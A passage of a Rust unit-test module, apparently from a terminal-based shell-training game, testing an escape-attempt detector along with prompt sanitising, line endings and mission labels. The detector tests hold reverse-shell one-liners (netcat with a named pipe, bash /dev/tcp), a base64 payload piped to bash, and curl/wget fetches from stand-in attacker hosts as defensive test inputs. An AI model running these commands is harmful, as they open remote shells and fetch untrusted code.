            escape_attempt_reason("mkfifo /tmp/f; nc -e /bin/bash host 4444"),
            Some("named pipe reverse shell probe")
        );
        assert_eq!(
            escape_attempt_reason("echo dGVzdA== | base64 -d | bash"),
            Some("encoded payload execution probe")
        );
        assert_eq!(
            escape_attempt_reason("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            Some("bash tcp redirect probe")
        );
        assert_eq!(
            escape_attempt_reason("curl https://evil.example.com/shell.sh"),
            Some("external host/network call attempt")
        );
        assert_eq!(
            escape_attempt_reason("wget http://attacker.example.org/payload"),
            Some("external host/network call attempt")
        );
        assert_eq!(escape_attempt_reason("ls /logs"), None);
        assert_eq!(escape_attempt_reason("cat /data/inventory.tsv"), None);
    }

    #[test]
    fn prompt_user_is_sanitized() {
        assert_eq!(sanitize_prompt_user("snake8503"), "snake8503");
        assert_eq!(sanitize_prompt_user("neo@203.0.113.10"), "neo");
        assert_eq!(sanitize_prompt_user("\x1b[31mroot"), "root");
        assert_eq!(sanitize_prompt_user(""), "guest");
    }

    #[test]
    fn line_endings_are_normalized_for_cross_terminal_clients() {
        assert_eq!(normalize_line_endings("a\nb"), "a\r\nb");
        assert_eq!(normalize_line_endings("a\r\nb\n"), "a\r\nb\r\n");
    }

    #[test]
    fn terminal_capability_detection_is_reasonable() {
        assert!(terminal_supports_ansi("xterm-256color"));
        assert!(!terminal_supports_ansi("dumb"));
        assert!(terminal_supports_unicode("xterm-256color"));
        assert!(!terminal_supports_unicode("vt100"));
        assert!(locale_supports_unicode("en_US.UTF-8"));
        assert!(!locale_supports_unicode("C"));
    }

    #[test]
    fn guide_is_registered_as_game_command() {
        assert!(is_game_command("guide"));
        assert!(is_game_command("briefing"));
    }

    #[test]
    fn mission_track_labels_are_human_readable() {
        assert_eq!(mission_track_label("keys-vault", true, false), "required");
        assert_eq!(mission_track_label("pipes-101", false, true), "starter");
        assert_eq!(mission_track_label("awk-patrol", false, false), "advanced");
        assert_eq!(mission_track_label("nav-101", false, false), "tutorial");
        assert_eq!(mission_track_label("head-tail", false, false), "intermed");
        assert_eq!(mission_track_label("deep-pipeline", false, false), "expert");
        assert_eq!(mission_track_label("decrypt-wren", false, false), "expert");
    }
}
